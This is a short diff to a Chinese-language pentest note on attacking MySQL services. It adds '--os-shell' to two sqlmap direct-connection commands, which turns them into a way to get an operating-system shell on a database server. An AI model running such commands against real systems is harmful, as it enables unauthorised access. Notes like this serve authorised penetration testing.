@@ -14,8 +14,8 @@ Mysql常见数据库服务。
 
 1. sqlmap自动利用
 ```bash
-sqlmap -d 'mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME'
-sqlmap -d 'access://DATABASE_FILEPATH'
+sqlmap -d 'mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME' --os-shell
+sqlmap -d 'access://DATABASE_FILEPATH' --os-shell
 ```
 
 2. 手动利用
